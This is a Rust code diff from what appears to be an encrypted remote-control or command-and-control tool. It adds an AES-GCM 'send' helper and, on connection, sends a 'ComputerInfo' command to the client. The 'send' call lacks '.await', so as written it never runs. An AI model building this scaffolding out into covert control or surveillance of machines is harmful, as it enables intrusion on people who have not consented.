@@ -11,6 +11,7 @@ use aes_gcm::aead::consts::U32;
 use aes_gcm::aead::generic_array::GenericArray;
 use aes_gcm::aead::{Aead, KeyInit};
 use aes_gcm::{Aes256Gcm, Key, Nonce};
+use shared::commands::{BaseCommand, Command};
 use shared::crypto::Encryption;
 use shared::types::ClientConfig;
 use smol::{
@@ -95,14 +96,28 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         }
 
         // send a payload here
-        let payload = b"hello world";
+        /*let payload = b"hello world";
         let payload_size = payload.len().to_le_bytes();
         println!("[*] sending payload size of {}", payload.len());
         stream.write_all(&payload_size).await?;
         println!("[*] sending payload!");
-        stream.write_all(payload).await?;
+        stream.write_all(payload).await?;*/
 
         let encryption = Encryption::new(_key);
+
+        // get computer info before anything happen
+        let _ = send(
+            &mut stream,
+            &encryption,
+            bincode::encode_to_vec(
+                BaseCommand {
+                    id: 0,
+                    command: Command::ComputerInfo,
+                },
+                bincode::config::standard(),
+            )
+            .unwrap(),
+        );
 
         match wait(stream, encryption).await {
             Ok(_) => {
@@ -117,6 +132,18 @@ fn main() -> Result<(), Box<dyn std::error::Error>> {
         println!("[v] closing");
         Ok(())
     })
+}
+
+async fn send(stream: &mut TcpStream, encryption: &Encryption, buf: Vec<u8>) {
+    if let Ok((nonce, encrypted)) = encryption.encrypt(&buf) {
+        let mut payload = Vec::new();
+        payload.extend_from_slice(&nonce);
+        payload.extend_from_slice(&encrypted);
+
+        let _ = shared::net::write(stream, &payload).await;
+    } else {
+        println!("[x] failed to write to client");
+    }
 }
 
 async fn wait(mut stream: TcpStream, encryption: Encryption) -> Result<(), std::io::Error> {
